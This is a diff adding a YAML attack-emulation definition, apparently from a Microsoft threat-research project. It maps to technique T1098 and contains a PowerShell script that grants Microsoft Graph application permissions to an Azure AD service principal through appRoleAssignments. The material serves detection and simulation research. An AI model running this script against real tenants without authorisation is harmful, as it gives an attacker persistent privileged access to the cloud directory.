@@ -1,0 +1,71 @@
+title: grantApplicationPermissions
+id: de534b7f-12cf-4c71-9a43-0e2af4fa0e84
+creationDate: '2021-08-09'
+modificationDate: '2021-08-09'
+description: |
+  A threat actor might want to grant application permissions to an Azure AD application (Service Principal).
+contributors:
+- Roberto Rodriguez @Cyb3rWard0g
+- MSTIC R&D
+ctiReferences:
+- https://msrc-blog.microsoft.com/2020/12/21/december-21st-2020-solorigate-resource-center/
+attackMappings:
+- technique: T1098
+  tactics:
+  - TA0003
+platform: Azure
+resource:
+  url: https://graph.microsoft.com/
+  authorization:
+    permissionsType: application
+    permissions:
+    - AppRoleAssignment.ReadWrite.All
+parameters:
+  applicationId:
+    type: string
+    description: The ID (client_id) of the application we want to grant permissions to.
+  resourceSpName:
+    type: string
+    description: Display name of the service principal for the resource we want to grant permissions from (i.e. Microsoft Graph).
+  permissions:
+    type: array
+    description: An array of permissions to grant to the application.
+  accessToken:
+    type: string
+    description: Access token with the right permissions to access and interact with the Azure resource.
+executor:
+  type: PowerShell
+  scriptContent: |
+    # Get service principal of Azure AD application
+    $AppServicePrincipal = Invoke-MSGraph -Resource "servicePrincipals" -QueryParameters "`$filter=appId eq '$($applicationId)'" -AccessToken $accessToken
+    if ($AppServicePrincipal.value.Count -ne 1) {
+      Write-Error "Found $($AppServicePrincipal.value.Count) service principals with application id '$($applicationId)'"
+    }
+    $AppServicePrincipalId = $AppServicePrincipal.value[0].id
+
+    # Get the service principal of resource we want to grant permissions from (i.e. Microsoft Graph)
+    $ResourceServicePrincipal = Invoke-MSGraph -Resource "servicePrincipals" -QueryParameters "`$filter=displayName eq '$resourceSpName'" -AccessToken $accessToken
+    if ($ResourceServicePrincipal.value.Count -ne 1) {
+      Write-Error "Found $($ResourceServicePrincipal.value.Count) service principals with displayName '$($resourceSpName)'"
+    }
+    $ResourceServicePrincipalId = $ResourceServicePrincipal.value[0].id
+
+    # Retrieve Role Assignments and create 'Resource Access Items'
+    $ResourceAccessItems = @()
+    Foreach ($AppPermission in $permissions) {
+      $RoleAssignment = $ResourceServicePrincipal.value[0].appRoles | Where-Object { $_.Value -eq $AppPermission }
+      $ResourceAccessItem = [PSCustomObject]@{
+        "principalId" = $AppServicePrincipalId
+        "resourceId"  = $ResourceServicePrincipalId
+        "appRoleId"   = $RoleAssignment.id
+      }
+      $ResourceAccessItems += $ResourceAccessItem
+    }
+    $RoleResults = @()
+    foreach ($role in $ResourceAccessItems) {
+      $RoleResults += Invoke-MSGraph -HttpMethod post -Resource "servicePrincipals/$AppServicePrincipalId/appRoleAssignments" -AccessToken $accessToken -Body $role
+    }
+    $RoleResults
+output:
+  response:
+    type: object
